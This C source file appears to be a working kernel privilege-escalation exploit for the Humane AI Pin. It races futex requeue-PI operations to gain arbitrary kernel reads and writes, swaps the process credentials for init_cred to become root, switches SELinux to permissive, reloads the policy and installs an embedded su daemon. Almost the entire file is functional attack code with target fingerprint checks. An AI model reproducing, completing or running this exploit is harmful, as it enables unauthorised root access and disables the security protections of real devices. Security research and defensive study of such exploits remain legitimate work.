/*
 * SPDX-License-Identifier: Apache-2.0
 * Humane AI Pin boot-scoped root route, 2026.
 *
 * This file is a new 4.14 target implementation built on the Apache-2.0
 * GhostLock technique published by NebuSec/CyberMeowfia.
 */
#include "common.h"

#include "perf_reclaim_gate.h"
#include <sys/system_properties.h>

#define READ_RETRIES 10
#define WRITE_RETRIES 10
#define ROUTE_RETRIES 3

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
uint64_t kaslr_slide;
uint64_t kaslr_base;
atomic_int consumer_calls;
atomic_int main_route_delay_usec;
atomic_int consumer_success;

static int get_property(const char *name, char value[PROP_VALUE_MAX]) {
  int length = __system_property_get(name, value);
  if (length <= 0 || length >= PROP_VALUE_MAX) {
    value[0] = 0;
    return 0;
  }
  return 1;
}

static int verify_live_target(void) {
  char fingerprint[PROP_VALUE_MAX];
  char slot[PROP_VALUE_MAX];
  char abi[PROP_VALUE_MAX];
  char version[512];
  char context[128];
  char enforcing[16];

  get_property("ro.build.fingerprint", fingerprint);
  get_property("ro.boot.slot_suffix", slot);
  get_property("ro.product.cpu.abi", abi);
  read_first_line("/proc/version", version, sizeof(version));
  read_first_line("/proc/self/attr/current", context, sizeof(context));
  read_first_line("/sys/fs/selinux/enforce", enforcing, sizeof(enforcing));

  int valid = strcmp(fingerprint, BUILD_FINGERPRINT) == 0 &&
              strcmp(slot, BUILD_SLOT) == 0 &&
              strcmp(abi, BUILD_ABI) == 0 &&
              strstr(version, TARGET_KERNEL_RELEASE) != NULL &&
              strstr(version, TARGET_KERNEL_BUILD_MARKER) != NULL &&
              getuid() == 2000 && geteuid() == 2000 &&
              strcmp(context, "u:r:shell:s0") == 0 &&
              strcmp(enforcing, "1") == 0;
  if (!valid) {
    pr_warning("target gate rejected fingerprint=%s slot=%s abi=%s uid=%u/%u "
               "context=%s enforcing=%s version=%s\n",
               fingerprint, slot, abi, getuid(), geteuid(), context, enforcing,
               version);
    return 0;
  }

  pr_success("target kernel accepted profile=%s slot=%s image_sha256=%s\n",
             BUILD_VARIANT_LABEL, slot, TARGET_KERNEL_IMAGE_SHA256);
  return 1;
}

static void *waiter_worker(void *unused) {
  (void)unused;
  disable_rseq_for_thread();
  atomic_store(&waiter_tid, (int)syscall(SYS_gettid));

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    return NULL;
  }
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec deadline;
  if (clock_gettime(CLOCK_MONOTONIC, &deadline) != 0) {
    return NULL;
  }
  deadline.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &deadline, &f_pi_target, 0);

  /* This must be the first stack-using operation after the futex returns. */
  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

static void *owner_worker(void *unused) {
  (void)unused;
  disable_rseq_for_thread();
  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    return NULL;
  }
  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  for (;;) {
    sleep(1);
  }
}

static void *consumer_worker(void *unused) {
  (void)unused;
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int handled = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int request = atomic_load(&punch_consume_go);
    if (!request || request == handled) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    handled = request;
    int tid = atomic_load(&waiter_tid);
    int delay = atomic_load(&main_route_delay_usec);
    if (delay > 0) {
      usleep((useconds_t)delay);
    }
    atomic_fetch_add(&consumer_calls, 1);
    errno = 0;
    long rc = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
    if (rc == 0) {
      atomic_fetch_add(&consumer_success, 1);
    }
    atomic_store(&punch_consume_go, 0);
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&consumer_success, 0);
  atomic_store(&consumer_calls, 0);
}

void run_main_route_threads(void) {
  reset_main_route_state();
  if (!prepare_pselect_fake_lock_route()) {
    pr_warning("waiter result-map preparation failed errno=%d\n", errno);
    return;
  }

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  if (pthread_create(&waiter, NULL, waiter_worker, NULL) != 0 ||
      pthread_create(&owner, NULL, owner_worker, NULL) != 0 ||
      pthread_create(&consumer, NULL, consumer_worker, NULL) != 0) {
    return;
  }

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }
  usleep(100000);
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
           &f_pi_target, 0);

  for (int elapsed_ms = 0;
       !atomic_load(&route_done) && elapsed_ms < 60000;
       ++elapsed_ms) {
    usleep(1000);
  }
}

static int decode_boot_id_bytes(unsigned char output[16]) {
  char text[64];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t got = read(fd, text, sizeof(text) - 1);
  close(fd);
  if (got <= 0) {
    return 0;
  }
  text[got] = 0;

  int high_nibble = -1;
  int bytes = 0;
  for (ssize_t i = 0; i < got && bytes < 16; ++i) {
    int nibble = hex_value(text[i]);
    if (nibble < 0) {
      continue;
    }
    if (high_nibble < 0) {
      high_nibble = nibble;
    } else {
      output[bytes++] = (unsigned char)((high_nibble << 4) | nibble);
      high_nibble = -1;
    }
  }
  return bytes == 16;
}

static int repin_and_check_cpu(const char *step) {
  pin_to_core((size_t)direct_root_cpu);
  int observed = sched_getcpu();
  if (observed != direct_root_cpu) {
    pr_warning("cpu pin lost step=%s expected=%d observed=%d\n",
               step, direct_root_cpu, observed);
    return 0;
  }
  return 1;
}

static int read_kernel_qword(uintptr_t address, uint64_t *value,
                             const char *label, int *sequence) {
  uintptr_t boot_id_slot = canon_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE);
  if (!value || !sequence || (address & 7) || (boot_id_slot & 7) ||
      !is_kernel_ptr(address) || !is_kernel_ptr(boot_id_slot)) {
    return 0;
  }

  for (int attempt = 1; attempt <= READ_RETRIES; ++attempt) {
    if (!repin_and_check_cpu("before-read")) {
      return 0;
    }
    int current = (*sequence)++;
    pr_info("kernel-read plan label=%s attempt=%d sequence=%d address=%016zx\n",
            label, attempt, current, address);
    if (!direct_pselect_write_once(boot_id_slot, address, 0, current)) {
      continue;
    }
    if (!repin_and_check_cpu("after-read-route")) {
      return 0;
    }

    unsigned char raw[16] = {0};
    if (!decode_boot_id_bytes(raw)) {
      return 0;
    }
    uint64_t observed = 0;
    uint64_t sidecar = 0;
    memcpy(&observed, raw, sizeof(observed));
    memcpy(&sidecar, raw + 8, sizeof(sidecar));
    int valid = sidecar == boot_id_slot;
    pr_info("kernel-read result label=%s value=%016llx sidecar=%016llx "
            "valid=%d\n", label, (unsigned long long)observed,
            (unsigned long long)sidecar, valid);
    if (!valid) {
      return 0;
    }
    *value = observed;
    return 1;
  }
  return 0;
}

static int read_enforcing(void) {
  char state[8];
  read_first_line("/sys/fs/selinux/enforce", state, sizeof(state));
  if (state[0] == '0' && state[1] == '\0') {
    return 0;
  }
  return (state[0] == '1' && state[1] == '\0') ? 1 : -1;
}

static int route_write(uintptr_t target, uintptr_t value, int shape,
                       const char *label, int *sequence) {
  for (int attempt = 1; attempt <= ROUTE_RETRIES; ++attempt) {
    int current = (*sequence)++;
    pr_info("kernel-write plan label=%s attempt=%d sequence=%d target=%016zx "
            "value=%016zx shape=%d\n",
            label, attempt, current, target, value, shape);
    if (direct_pselect_write_once(target, value, shape, current)) {
      return 1;
    }
  }
  return 0;
}

static int route_write_until_success(uintptr_t target, uintptr_t value,
                                     int shape, const char *label,
                                     int *sequence) {
  for (int attempt = 1; attempt <= WRITE_RETRIES; ++attempt) {
    if (route_write(target, value, shape, label, sequence)) {
      return 1;
    }
  }
  return 0;
}

static int install_cred_and_disable_selinux(
    uintptr_t cred_slot, uintptr_t init_cred, uintptr_t enforcing_slot,
    int *sequence) {
  for (int attempt = 1; attempt <= WRITE_RETRIES; ++attempt) {
    int primary_sequence = (*sequence)++;
    int followup_sequence = *sequence;
    *sequence += DIRECT_FOLLOWUP_ATTEMPTS;
    int routed = direct_pselect_write_followup_once(
        cred_slot, init_cred, 1, primary_sequence,
        enforcing_slot, followup_sequence);
    int permissive = read_enforcing() == 0;
    pr_info("credential effect attempt=%d routed=%d uid=%u euid=%u "
            "permissive=%d\n",
            attempt, routed, getuid(), geteuid(), permissive);
    if (routed && permissive && getuid() != 2000) {
      return 1;
    }
  }
  return 0;
}

static int reload_current_selinux_policy(size_t *loaded_bytes) {
  int source = open("/sys/fs/selinux/policy", O_RDONLY | O_CLOEXEC);
  if (source < 0) {
    return 0;
  }
  struct stat metadata;
  if (fstat(source, &metadata) != 0 || metadata.st_size <= 0 ||
      metadata.st_size > 32 * 1024 * 1024) {
    close(source);
    return 0;
  }

  size_t size = (size_t)metadata.st_size;
  unsigned char *policy = malloc(size);
  if (!policy) {
    close(source);
    return 0;
  }
  size_t offset = 0;
  while (offset < size) {
    ssize_t chunk = read(source, policy + offset, size - offset);
    if (chunk < 0 && errno == EINTR) {
      continue;
    }
    if (chunk <= 0) {
      free(policy);
      close(source);
      return 0;
    }
    offset += (size_t)chunk;
  }
  close(source);

  int destination = open("/sys/fs/selinux/load", O_WRONLY | O_CLOEXEC);
  if (destination < 0) {
    free(policy);
    return 0;
  }
  ssize_t written;
  do {
    written = write(destination, policy, size);
  } while (written < 0 && errno == EINTR);
  close(destination);
  free(policy);
  if (written != (ssize_t)size) {
    return 0;
  }
  if (loaded_bytes) {
    *loaded_bytes = size;
  }
  return 1;
}

static int run_id_command(void) {
  pid_t child = fork();
  switch (child) {
  case -1:
    return 0;
  case 0:
    execl("/system/bin/id", "id", (char *)NULL);
    _exit(127);
  default:
    break;
  }
  int status = 0;
  pid_t waited;
  do {
    waited = waitpid(child, &status, 0);
  } while (waited < 0 && errno == EINTR);
  return waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static int perform_root_sequence(void) {
  int sequence = 0;
  if (!repin_and_check_cpu("root-start")) {
    return 0;
  }

  uintptr_t per_cpu_array = canon_addr(PER_CPU_OFFSET);
  uintptr_t per_cpu_slot = per_cpu_array +
      (uintptr_t)direct_root_cpu * sizeof(uint64_t);
  uint64_t per_cpu_delta = 0;
  if (!read_kernel_qword(per_cpu_slot, &per_cpu_delta,
                         "per_cpu_offset", &sequence) ||
      !per_cpu_delta || (per_cpu_delta & (PAGE_SIZE - 1)) ||
      per_cpu_delta >= (1ULL << 39)) {
    return 0;
  }

  uintptr_t entry_slot = canon_addr(ENTRY_TASK) + (uintptr_t)per_cpu_delta;
  uint64_t task_value = 0;
  if (!is_direct_ptr(entry_slot) || (entry_slot & 7) ||
      !read_kernel_qword(entry_slot, &task_value, "entry_task", &sequence) ||
      !is_direct_ptr((uintptr_t)task_value) || (task_value & 7)) {
    return 0;
  }
  uintptr_t task = (uintptr_t)task_value;
  pr_success("direct-entry task=%016zx cpu=%d pid=%d\n",
             task, direct_root_cpu, getpid());

  if (read_enforcing() != 1) {
    return 0;
  }
  uintptr_t init_cred = canon_addr(INIT_CRED);
  uintptr_t real_cred_slot = task + TASK_REAL_CRED_OFF;
  uintptr_t cred_slot = task + TASK_CRED_OFF;

  if (!route_write_until_success(real_cred_slot, init_cred, 1,
                                 "real_cred", &sequence)) {
    return 0;
  }
  if (getuid() != 2000 || read_enforcing() != 1) {
    return 0;
  }

  uintptr_t enforcing_slot = canon_addr(SELINUX_ENFORCING);
  if (!install_cred_and_disable_selinux(
          cred_slot, init_cred, enforcing_slot, &sequence)) {
    return 0;
  }

  int repaired = 0;
  for (int attempt = 1; attempt <= WRITE_RETRIES; ++attempt) {
    int routed = route_write(init_cred + 4, 0, 1,
                             "repair_init_cred_ids", &sequence);
    repaired = getuid() == 0 && geteuid() == 0 &&
               getgid() == 0 && getegid() == 0;
    pr_info("credential repair attempt=%d routed=%d repaired=%d ids=%u/%u/%u/%u\n",
            attempt, routed, repaired,
            getuid(), geteuid(), getgid(), getegid());
    if (routed && repaired) {
      break;
    }
  }
  if (!repaired || !restore_initial_affinity()) {
    return 0;
  }

  size_t policy_bytes = 0;
  if (!reload_current_selinux_policy(&policy_bytes)) {
    return 0;
  }
  int enforcing_after = read_enforcing();
  pr_success("direct credential result uid=%u euid=%u gid=%u egid=%u "
             "task=%016zx init_cred=%016zx selinux=1->%d policy_reload=%zu\n",
             getuid(), geteuid(), getgid(), getegid(), task, init_cred,
             enforcing_after, policy_bytes);

  int id_ok = run_id_command();
  pid_t daemon_pid = -1;
  errno = 0;
  int su_ok = install_embedded_su(&daemon_pid);
  int su_errno = errno;
  int root_ok = getuid() == 0 && geteuid() == 0 &&
                getgid() == 0 && getegid() == 0 &&
                enforcing_after == 0 && id_ok && su_ok;
  pr_success("direct-root-summary root=%d id=%d su=%d/%d daemon=%d "
             "selinux=1->%d uid=%u euid=%u gid=%u egid=%u\n",
             root_ok, id_ok, su_ok, su_errno, daemon_pid, enforcing_after,
             getuid(), geteuid(), getgid(), getegid());
  int final_result = root_ok;
  return final_result;
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();

  if (!verify_live_target()) {
    return 3;
  }
  if (!init_direct_root_cpu() || !p0_env_init()) {
    pr_warning("runtime initialization failed errno=%d\n", errno);
    return 2;
  }
  if (!ghostlock_perf_gate_init() || !ghostlock_perf_gate_enabled()) {
    pr_warning("same-PFN perf gate is required and could not be armed\n");
    return 2;
  }
  log_startup_context();
  pin_to_core(CORE);
  return perform_root_sequence() ? 0 : 1;
}
